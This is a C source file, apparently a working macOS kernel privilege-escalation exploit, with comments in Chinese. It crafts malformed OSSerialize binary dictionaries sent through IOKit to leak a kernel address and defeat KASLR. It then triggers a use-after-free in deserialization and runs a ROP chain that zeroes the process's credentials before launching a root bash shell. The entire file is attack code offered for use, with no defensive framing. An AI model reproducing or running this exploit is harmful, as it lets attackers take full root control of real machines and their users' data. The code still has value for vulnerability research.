#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

#include "librop/librop.h"

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
//0xd3
#define kOSSerializeCodeSignature "\323\0\0"

enum {
  kOSSerializeDictionary = 0x01000000U,
  kOSSerializeArray        = 0x02000000U,
  kOSSerializeSet          = 0x03000000U,
  kOSSerializeNumber       = 0x04000000U,
  kOSSerializeSymbol       = 0x08000000U,
  kOSSerializeString       = 0x09000000U,
  kOSSerializeData         = 0x0a000000U,
  kOSSerializeBoolean      = 0x0b000000U,
  kOSSerializeObject       = 0x0c000000U,
  kOSSerializeTypeMask     = 0x7F000000U,
  kOSSerializeDataMask     = 0x00FFFFFFU,
  kOSSerializeEndCollection = 0x80000000U,
};


uint64_t info_leak(void){
  kern_return_t kr=0,err=0;
  //mach端口
  mach_port_t res=MACH_PORT_NULL,master=MACH_PORT_NULL;

  //iokit的参数 
  io_service_t serv = 0;
  io_connect_t conn = 0;
  io_iterator_t iter = 0;
  
  //构造字典
  void *dict = calloc(1, 512);
  int index = 0;
  
  memcpy(dict, kOSSerializeCodeSignature ,sizeof(kOSSerializeCodeSignature));
  index += sizeof(kOSSerializeCodeSignature);
  *(uint32_t *)(dict+index) = kOSSerializeDictionary | kOSSerializeEndCollection | 2;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeSymbol | 4;
  index += 4;  
  *(uint32_t *)(dict+index) = 0x00414141;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeNumber | kOSSerializeEndCollection | 0x200;
  index += 4;
  //因为要编译成32bit所以按照32bit写入
  *(uint32_t *)(dict+index) = 0x41414141;
  index += 4;
  *(uint32_t *)(dict+index) = 0x41414141;
  index += 4;
  host_get_io_master(mach_host_self(), &master);
  kr = io_service_get_matching_services_bin(master, (char *)dict, index ,&res);
  if(kr != KERN_SUCCESS) return -1;
  printf("字典合法，success\n");

  serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController")); 
  kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, index, &err, &conn);
  
  if(kr != KERN_SUCCESS) return -1;
  printf("泄漏成功, success\n");
  

  IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
  io_object_t object = IOIteratorNext(iter);

  char buffer[0x20A] = {0};
  mach_msg_type_number_t bufLen = 0x200;
  if(kr!=KERN_SUCCESS) return -1;
  kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&buffer, &bufLen);
/*
  for(uint32_t k = 0; k < 128; k += 8) {
        printf("%llx\n", *(uint64_t *)(buffer + k));
  }
*/  
  //硬编码地址要自己逆向去找
  uint64_t hard_code_ret_addr = 0xffffff800039bc2f;
  //地址是内核栈上的第几个也要通过打印自己看
  printf("KASLR is :%llx\n", (*(uint64_t *)(buffer+7*sizeof(uint64_t)))-hard_code_ret_addr);
  return (*(uint64_t *)(buffer+7*sizeof(uint64_t)))-hard_code_ret_addr;
}

void uaf(){
  kern_return_t kr = 0;
  mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
  rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));  
  //构造字典
  void *dict = calloc(1, 512);
  int index = 0;

  printf("high: %x, low: %x\n, whole: %llx", (uint32_t)((uint64_t)chain->chain >> 32), (uint32_t)chain->chain, (uint64_t)chain->chain);
//获取内核偏移
  SET_KERNEL_SLIDE(info_leak());
  //拿到内核
  macho_map_t *map = map_file_with_path("/System/Library/Kernels/kernel");
  printf("开始构造 ROP chain\n"); 

/*
  chain->chain[0] = 0;
  chain->chain[1] = 0;
  chain->chain[2] = 0;
  chain->chain[3] = ROP_POP_RBX(map);
  chain->chain[4] = ROP_XCHG_RSP_RAX(map);
  chain->chain[5] = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));
  chain->chain[6] = ROP_RAX_TO_ARG1(map, chain);
  chain->chain[7] = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));
  chain->chain[8] = ROP_RAX_TO_ARG1(map, chain);
  chain->chain[9] = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));
  chain->chain[10] = ROP_RAX_TO_ARG1(map, chain);
  chain->chain[11] = ROP_ARG2(chain, map, (sizeof(int) * 3));
  chain->chain[12] = SLIDE_POINTER(find_symbol_address(map, "_bzero"));
  chain->chain[13] = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));
  for(int i = 0 ;i < 14 ;i++)
	printf("%d: %d\n",i, chain->chain[i]);
*/


  //为了更直观我就不用宏了
  memcpy(dict, kOSSerializeCodeSignature, sizeof(kOSSerializeCodeSignature));
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeDictionary | kOSSerializeEndCollection | 6;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeString | 4;
  index += 4;
  *(uint32_t *)(dict+index) = 0x00414141;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeBoolean | 1;
   index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeSymbol | 4;
  index += 4;
  *(uint32_t *)(dict+index) = 0x00424242;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeData | 0x20;
  index += 4;
  *(uint32_t *)(dict+index) = (uint32_t)chain->chain;
  index += 4;
  *(uint32_t *)(dict+index) = (uint32_t)((uint64_t)chain->chain>>32);
  index += 4;
  for(int i = 0 ; i < 6 ;i++){
  *(uint32_t *)(dict+index) = 0x00000000; 
  index += 4;
  }
  *(uint32_t *)(dict+index) = kOSSerializeSymbol | 4;
  index += 4;
  *(uint32_t *)(dict+index) = 0x00434343;
  index += 4;
  *(uint32_t *)(dict+index) = kOSSerializeObject | kOSSerializeEndCollection | 1;
  index += 4;

  
  
  PUSH_GADGET(chain) = 0;
  PUSH_GADGET(chain) = 0;
  PUSH_GADGET(chain) = 0;
  PUSH_GADGET(chain) = ROP_POP_RBX(map);
  PUSH_GADGET(chain) = ROP_XCHG_RSP_RAX(map);
  PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));
  PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
  PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));
  PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
  PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));
  PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
  PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));
  PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_bzero"));
  PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));

for(int i = 0 ;i < 16 ;i++)
	printf("%d: %llx\n",i, chain->chain[i]);

  //触发反序列化
  host_get_io_master(mach_host_self(), &master);

  kr = io_service_get_matching_services_bin(master, (char *)dict, index, &res);
  if (kr != KERN_SUCCESS)
      return;


}

int main(){
  sync();
  uaf();
  if(getuid() == 0){
    printf("exploit successfully~\n");
    system("/bin/bash");
  }
  return 0;  
}
